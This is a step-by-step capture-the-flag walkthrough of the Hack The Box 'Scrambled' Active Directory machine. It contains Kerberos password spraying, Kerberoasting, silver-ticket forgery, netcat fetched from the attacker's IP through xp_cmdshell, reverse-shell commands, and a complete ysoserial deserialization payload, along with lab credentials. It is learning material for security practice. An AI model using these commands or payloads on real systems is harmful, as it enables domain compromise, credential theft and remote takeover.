# Scrambled

## nmap: 

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 14:46 +01
Nmap scan report for 10.10.11.168
Host is up (0.13s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-09 13:49:45Z)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-09T13:50:27+00:00; +1m37s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-08-09T13:50:27+00:00; +1m37s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m36s, deviation: 0s, median: 1m36s


enumerating ldap

└─$ ldapsearch -H ldaps://scrm.local:3269/ -x -s base -b '' "(objectClass=*)" "*" +
ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)

```

found a page at port: 80

`http://10.10.11.168/`


 Found a note: 
 
 `04/09/2021: Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems for some of the programs you use so please be patient while we work to resolve any issues`


found a user at `http://10.10.11.168/supportrequest.html`

`ksimpson`


verified by kerbrute:
```bash
└─$ kerbrute userenum --dc 10.10.11.168 -d scrm.local users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/11/22 - Ronnie Flathers @ropnop

2022/08/11 18:03:18 >  Using KDC(s):
2022/08/11 18:03:18 >   10.10.11.168:88

2022/08/11 18:03:18 >  [+] VALID USERNAME:       ksimpson@scrm.local
2022/08/11 18:03:18 >  Done! Tested 1 usernames (1 valid) in 0.157 seconds


NOTE: always try username for password attemptation

└─$ kerbrute bruteuser --dc 10.10.11.168 -d scrm.local  ~/Downloads/rockyou.txt ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/11/22 - Ronnie Flathers @ropnop

2022/08/11 18:16:05 >  Using KDC(s):
2022/08/11 18:16:05 >   10.10.11.168:88

2022/08/11 18:16:06 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2022/08/11 18:16:07 >  Done! Tested 31 logins (1 successes) in 1.218 seconds


```


password: ksimpson

Overpass The Hash/Pass The Key (PTK)

This attack aims to use user NTLM hash to request Kerberos tickets, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially useful in networks where NTLM protocol is disabled and only Kerberos is allowed as authentication protocol.

Impacket’s getTGT.py uses a valid user’s NTLM hash / Password to request Kerberos tickets, in order to access any service or machine where that user has permissions.


GetUsersSPN but it didn't work. I had to edit the script to this: 

```python
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__doKerberos:
            #target = self.getMachineName()
            target = self.__kdcHost
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain
+ 
```
```
└─$ export KRB5CCNAME=ksimpson.ccache          
```

`python3 ~/tools/ad_tools/impacket/examples/GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local  -no-pass -k -outputfile hashes.kerberoast`




 `GetUserSPNs.py` will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account’s password, which can then be bruteforced offline.

A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.

`sqlsvc:Pegasus60` 

Using secretsdump.py 

```bash
└─$ secretsdump.py -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/impacket
[+] Using Kerberos Cache: ksimpson.ccache
[+] SPN CIFS/DC1.SCRM.LOCAL@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at SCRM.LOCAL
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_VwSjeyuX
[+] Trying to connect to KDC at SCRM.LOCAL
[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500 
[+] Calling DRSGetNCChanges for {edaf791f-e75b-4711-8232-3cd66840032a} 
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/EGG-INFO/scripts/secretsdump.py", line 230, in dump
    self.__NTDSHashes.dump()
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/impacket/examples/secretsdump.py", line 2612, in dump
    userRecord = self.__remoteOps.DRSGetNCChanges(
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/impacket/examples/secretsdump.py", line 580, in DRSGetNCChanges
    return self.__drsr.request(request)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 880, in request
    raise exception
impacket.dcerpc.v5.drsuapi.DCERPCSessionError: DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 

```

Impacket’s secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following command will attempt to dump all secrets from the target machine using the previously mentioned techniques.


It won't work here because we need an adiministartor account but we get the SID: 

`S-1-5-21-2743207045-1827831105-2542523200-500`

I had to convert the password to NTML Hash. 

`B999A16500B87D17EC7F2E2A68778F05`

Using ticketer

SILVER Ticket. 

The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of a user account is owned. Thus, it is possible to gain access to that service by forging a custom TGS with the maximum privileges inside it.
```bash
└─$ ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain scrm.local -dc-ip 10.10.11.168 -spn MSSQLSVC/scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -user-id 500 Administrator  
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```


NOTE: Administrator id is always 500

Impacket’s ticketer.py can perform Silver Ticket attacks, which crafts a valid TGS ticket for a specific service using a valid user’s NTLM hash. It is then possible to gain access to that service. The following command crafts a TGS for the SMB service, which can then be used to gain a shell.

`export KRB5CCNAME=Administrator.ccache`


```bash
└─$ python3 mssqlclient.py Administrator@dc1.scrm.local -k -no-pass -debug 
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/impacket
[*] Encryption required, switching to TLS
[+] Using Kerberos Cache: /home/user/hackthebox/scrambled/Administrator.ccache
[+] Domain retrieved from CCache: SCRM.LOCAL
[+] SPN MSSQLSVC/DC1.SCRM.LOCAL:1433@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] SPN KRBTGT/SCRM.LOCAL@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for MSSQLSVC/SCRM.LOCAL@SCRM.LOCAL
[+] Using TGT from cache
[+] Searching target's instances to look for port number 1433
[+] Trying to connect to KDC at SCRM.LOCAL
[+] Server time (UTC): 2022-08-12 15:28:40
[+] Exception:
Traceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/mssqlclient.py", line 172, in <module>
    res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey,
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/impacket/tds.py", line 769, in kerberosLogin
    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/impacket/krb5/kerberosv5.py", line 438, in getKerberosTGS
    r = sendReceive(message, domain, kdcHost)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/impacket/krb5/kerberosv5.py", line 91, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

I had issue with the hash. I had to use lowercase hash

```bash
┌──(user㉿marco)-[~/hackthebox/scrambled]
└─$ ticketer.py -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200

Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
                                                                                                                                                                                             
┌──(user㉿marco)-[~/hackthebox/scrambled]
└─$ mssqlclient.py dc1.scrm.local -k -no-pass -debug                                                                                                                                     
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220513.140233.fb1e50c1-py3.10.egg/impacket
[*] Encryption required, switching to TLS
[+] Using Kerberos Cache: Administrator.ccache
[+] Domain retrieved from CCache: SCRM.LOCAL
[+] SPN MSSQLSVC/DC1.SCRM.LOCAL:1433@SCRM.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for MSSQLSVC/DC1.SCRM.LOCAL@SCRM.LOCAL
[+] Using TGS from cache
[+] Changing sname from MSSQLSVC/dc1.scrm.local@SCRM.LOCAL to MSSQLSVC/DC1.SCRM.LOCAL:1433@SCRM.LOCAL and hoping for the best
[+] Username retrieved from CCache: Administrator
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 


```


Found this article to get shell: 

https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/

But before that I tried to browse the tables. 

```bash

SQL> SELECT name FROM master.dbo.sysdatabases
name                                                                                                                               

--------------------------------------------------------------------------------------------------------------------------------   

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb                                                                                                                               

ScrambleHR 
```

ScrambleHR Looks interesting

https://www.tutorialspoint.com/ms_sql_server/ms_sql_server_select_database.htm

```bash
SQL> use ScrambleHR
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
SQL> select * from UserImport
LdapUser                                             LdapPwd                                              LdapDomain                                           RefreshInterval   IncludeGroups   

--------------------------------------------------   --------------------------------------------------   --------------------------------------------------   ---------------   -------------   

MiscSvc                                              ScrambledEggs9900                                    scrm.local                                                        90               0   

SQL> 
```


```bash
SQL> xp_cmdshell whoami
output                                                                             

--------------------------------------------------------------------------------   

scrm\sqlsvc                                                                        

NULL  
```

# Uploading Netcat


```bash
SQL> xp_cmdshell curl http://10.10.14.115:8080/nc.exe --output C:\Temp\netcat.exe
output                                                                             

--------------------------------------------------------------------------------   

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current    

                                 Dload  Upload   Total   Spent    Left  Speed      

100 38616  100 38616    0     0   144k      0 --:--:-- --:--:-- --:--:--  145k   

NULL                                                                               

SQL> xp_cmdshell dir C:\Temp\

16/08/2022  16:31            38,616 netcat.exe                                     

               1 File(s)         38,616 bytes                                      

               2 Dir(s)  15,946,366,976 bytes free                                 

NULL                                                                               

SQL> 

```

After uploading netcat. We use a reverse shell

`SQL> xp_cmdshell C:\Temp\netcat.exe -e powershell 10.10.14.115 1337`

$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc', $SecPassword)
Invoke-Command -Computer dc1 -Credential $Cred -Command { whoami }

Invoke-Command -Computer dc1 -Credential $Cred -Command { cmd /c C:\Temp\netcat.exe -e powershell 10.10.14.115 1338 }

```bash

└─$ nc -lnvp 1338
listening on [any] 1338 ...
connect to [10.10.14.115] from (UNKNOWN) [10.10.11.168] 58376
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\miscsvc\Documents> cd ../
cd ../
PS C:\Users\miscsvc> cd Desktop
cd Desktop
PS C:\Users\miscsvc\Desktop> dir
dir


    Directory: C:\Users\miscsvc\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---       14/08/2022     22:09             34 user.txt                                                              


PS C:\Users\miscsvc\Desktop> type user.txt
type user.txt

```
# Root

After browsing and running winpeas. I found files in Shares.

```
PS C:\Shares\IT\Apps\Sales Order Client> ls
ls


    Directory: C:\Shares\IT\Apps\Sales Order Client


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                                    
-a----       05/11/2021     20:52          19456 ScrambleLib.dll                                                       


PS C:\Shares\IT\Apps\Sales Order Client> 
```

Decompiling the ScrambleLib.dll using dotPeek.


.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.115 1337"


`
public void UploadOrder(SalesOrder NewOrder)
{
    try
    {
        Log.Write("Uploading new order with reference " + NewOrder.ReferenceNumber);
        string text = NewOrder.SerializeToBase64();
        Log.Write("Order serialized to base64: " + text);
        ScrambleNetResponse scrambleNetResponse = this.SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.UploadOrd...
        ScrambleNetResponse.ResponseType type = scrambleNetResponse.Type;
        if (type != ScrambleNetResponse.ResponseType.Success)
        {
            throw new ApplicationException(scrambleNetResponse.GetErrorDescription());
        }
        Log.Write("Upload successful");
    }
    catch (Exception expr_5F)
    {
    ProjectData.SetProjectError(expr_5F);
    Exception ex = expr_5F;
    Log.Write("Error: " + ex.Message);
    throw ex;
    }
}
`



payload 

'''bash
\Desktop\Release>cmd.exe /c .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.115 1337"
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAgApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBNFFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1WMFkyRjBMbVY0WlNBdFpTQndiM2RsY25Ob1pXeHNJREV3TGpFd0xqRTBMakV4TlNBeE16TTNJaUJUZEdGdVpHRnlaRVZ5Y205eVJXNWpiMlJwYm1jOUludDRPazUxYkd4OUlpQlRkR0Z1WkdGeVpFOTFkSEIxZEVWdVkyOWthVzVuUFNKN2VEcE9kV3hzZlNJZ1ZYTmxjazVoYldVOUlpSWdVR0Z6YzNkdmNtUTlJbnQ0T2s1MWJHeDlJaUJFYjIxaGFXNDlJaUlnVEc5aFpGVnpaWEpRY205bWFXeGxQU0pHWVd4elpTSWdSbWxzWlU1aGJXVTlJbU50WkNJZ0x6NE5DaUFnSUNBZ0lEd3ZjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdQQzl6WkRwUWNtOWpaWE56UGcwS0lDQThMMDlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVQWW1wbFkzUkpibk4wWVc1alpUNE5Dand2VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5UGdzPQs=
```

```bash
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.115] from (UNKNOWN) [10.10.11.168] 56383
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt

```
